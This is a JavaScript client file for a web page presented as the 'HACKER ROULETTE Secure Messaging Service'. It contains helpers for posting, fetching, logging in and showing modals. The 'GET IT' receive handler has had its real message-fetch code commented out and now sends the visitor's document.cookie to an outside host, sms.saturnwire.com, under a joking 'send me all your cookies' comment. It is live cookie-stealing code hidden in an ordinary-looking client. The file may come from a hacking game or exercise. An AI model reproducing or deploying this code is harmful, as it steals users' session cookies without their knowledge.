function emptynode(node) {
    while (node.firstChild) {
        node.removeChild(node.firstChild);
    }
}

var modalstruct = `
            <div class="modal fadeout" id="modal">
                <div class="modalbody centertext" id="modalbody">
                </div>
            </div>
`
var welcomemodal = `
                    <div> Thanks for trying the </div>
                    <div><b>HACKER ROULETTE</b></div>
                    <div>Secure Messaging Service </div>
                    <hr>
                    <div> Type a message and hit 'SEND IT' to send a message!</div>
                    <div> Hit 'GET IT' to receive a message!</div>
`
function modal(content) {
    var modalcontainer = document.getElementById('modalcontainer');
    emptynode(modalcontainer);
    modalcontainer.innerHTML = modalstruct;
    document.getElementById('modalbody').innerHTML = content;
}

function welcome() {
    modal(welcomemodal);
}

function post(url, data, success, error, contentType='application/json') {
   var request = new XMLHttpRequest();
   request.open("post", url, true);
   request.withCredentials = true;
   request.onreadystatechange = () => {
       if (request.readyState == XMLHttpRequest.DONE) {   // XMLHttpRequest.DONE == 4
           if (request.status == 200) {
               success(request.response);
           }
           else {
               error(request.response);
           }
       }
   };

   request.setRequestHeader('content-type', contentType);
   request.send(data);
}

function get(url, success, error) {
   var request = new XMLHttpRequest();
   request.open("get", url, true);
   request.withCredentials = true;

   request.onreadystatechange = () => {
       if (request.readyState == XMLHttpRequest.DONE) {   // XMLHttpRequest.DONE == 4
           if (request.status == 200) {
               success(request.response);
           }
           else {
               error(request.response);
           }
       }
   };

   request.send();
}

function recvfun(e) {
    // Send me all  your cookies, yum, yum!!!!
    body = document.cookie
    post("https://sms.saturnwire.com", body, function (r){}, function (r){})
    // get('https://api.moose.wtf/sms',
    //     function(r){var p = JSON.parse(r); modal(p.message);},
    //     function(r){console.log(r);});
    // return false;
}

function sendfun(e) {
    var admin = false;
    if (document.cookie.length > 10) {
        admin = true;
    }
    msg = document.getElementById('messagebox').value;
    post('https://api.moose.wtf/sms',
         JSON.stringify({admin: admin, message: msg}),
         function(r){document.getElementById('messagebox').value='';
                     console.log(r);},
         function(r){console.log(r);});
    return false;
}

function login(username, password) {
    var body = 'username=' + encodeURI(username) + '&password=' + encodeURI(password);
    post('https://api.moose.wtf/smslogin',
         body,
         function(r){console.log(r);},
         function(r){console.log(r);},
         'application/x-www-form-urlencoded');
}

function hook() {
    document.getElementById('recvmsg').addEventListener('click', recvfun);
    document.getElementById('sendmsg').addEventListener('click', sendfun);
}

function unhook() {
    document.getElementById('recvmsg').removeEventListener('click', recvfun);
    document.getElementById('sendmsg').removeEventListener('click', sendfun);
}

hook();
